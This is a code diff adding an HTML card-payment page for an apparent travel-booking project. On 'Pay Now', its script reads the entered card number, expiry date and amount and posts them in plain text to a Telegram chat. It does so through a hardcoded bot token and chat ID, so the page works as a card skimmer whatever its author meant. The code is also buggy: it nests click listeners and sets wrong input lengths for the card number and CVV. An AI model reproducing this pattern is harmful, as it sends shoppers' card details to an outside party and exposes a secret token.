@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <script src="https://kit.fontawesome.com/7e84f50eff.js" crossorigin="anonymous"></script>
+
+        <link rel="stylesheet" href="card.css">
+    </head>
+    <body>
+        <div class="container">
+            <div class="left">
+                <p>payment methods</p>
+                <hr style="border: 1px solid #121212; margin: 0px 10px;">
+                <div class="methods">
+                    <div onclick="doFun()" id="tColorA"style ="color:greenyellow";><i class="fa-solid fa-credit-card"></i>payment by card</div>
+                        <div onclick="doFunA()" id="tColorB"><i class="fa-solid fa-building-coloumns"></i>Internet banks</div>
+                        <div onclick="doFunB()" id="tColorC"><i class="fa-solid fa-wallet"></i>UPI pay</div>
+                        </div>
+                        <!--<hr style="border :1px solid #0a0a0a; margin:10px 15px;">-->
+                        </div>
+                        <div class="center">
+                            <a href="https://www.shift4shop.com/credit-card-logos.html"><img alt="credit card logos" title="Credit card logo" src="https://www.shift4shop.com/images/credit-card-logos/cc-lg-4.png" width="150" height="auto"/></a>
+                            <!--<hr style="border: 1px solid #000000;margin: 0 15px;">-->
+                            <div class="card-details">
+                                <form>
+                                    <p style="font-size: 20px;">Card number</p>
+                                    <div class="c-number" id="c-number">
+                                        <input id="number" class="cc-number" placeholder="Card number" maxlength="10" required>
+                                        <i class="fa-solid fa-credit-card" style="margin: 0;"></i>
+                                    </div>
+                                    <div class="c-details">
+                                        <div>
+                                            <p style="font-size: 20px;">Expiry date</p>
+                                            <input id="e-date" class="cc-exp" placeholder="MM/YY" maxlength="5" required>
+                                        </div>
+                                        <div>
+                                            <p style="font-size: 20px;">CVV</p>
+                                            <div class="cvv-box" id="cvv-box">
+                                                <input id="cvv" class="cc-cvv" placeholder="CVV" required maxlength="19 " required>
+                                                <i class="fa-solid fa-circle-question" title="3 digits on the back of card" style="cursor: pointer;"></i>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="email">
+                                        <p style="font-size: 20px;">Amount</p>
+                                        <input type="amount" placeholder="amount to be paid" id="amount" required>
+                                    </div>
+                                    <div class="u-center-text u-margin-top-big">
+                                        <button type="button" id="payNowButton" class="btn btn--green">Pay Now </button>
+                                    </div>
+                                    
+                                </form>
+                            </div>
+                        </div>
+
+
+                        <div class="right">
+                            <p>Order information</p>
+                            <hr style="border: 1px solid #000000; margin: 0 15px;">
+                            <div class="details">
+                                <div style="font-weight: bold; padding: 3px 0;">Order description</div>
+                                <div style="padding: 3px 0;">Test payment</div>
+                            </div>
+                            <hr style="border: 1px solid#000000; margin: 0 15px;">
+                            <a href="https://www.shift4shop.com/credit-card-logos.html"><img alt="credit card logos" title="Credit card logo" src="https://www.shift4shop.com/images/credit-card-logos/cc-lg-4.png" width="100%" height="auto"/></a>
+                        </div>
+                        </div>
+                        <script>
+                            
+                            const payNowButton = document.getElementById('payNowButton');
+
+                            payNowButton.addEventListener('click', function () {
+                // Your existing JavaScript code here
+                            
+                                payNowButton.addEventListener('click', function () {
+                                    // Get the input values or other necessary data
+                                    const cardNumber = document.getElementById('number').value;
+                                    const expiryDate = document.getElementById('e-date').value;
+                                    const cvv = document.getElementById('cvv').value;
+                                    const amount = document.getElementById('amount').value;
+                    
+                                    // Construct the message to be sent to Telegram
+                                    const message = `Thank You for Booking Ticket in Travel planner:\nNew payment received:\nCard Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nAmount: ${amount}`;
+                    
+                                    // Replace 'YOUR_BOT_TOKEN' and 'YOUR_ACTUAL_CHANNEL_OR_USER_ID' with your actual bot token and chat ID
+                                    const botToken = '6842045986:AAG4jJOaD2UBVEwz5mXHCalxRccL0yJXqwA';
+                                    const channelIdOrUserId = '1530814336';
+                    
+                                    // Make the API call to send the message
+                                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                                        method: 'POST',
+                                        headers: {
+                                            'Content-Type': 'application/json',
+                                        },
+                                        body: JSON.stringify({
+                                            chat_id: channelIdOrUserId,
+                                            text: message,
+                                        }),
+                                    })
+                                        .then(response => response.json())
+                                        .then(data => {
+                                            console.log('Telegram API response:', data);
+                                            // You can handle the response if needed
+                                        })
+                                        .catch(error => {
+                                            console.error('Error sending Telegram message:', error);
+                                        });
+                                });
+                            });
+                        </script>
+                        
+                        <script src="card.js"></script>
+                        </body>
+                        </html>
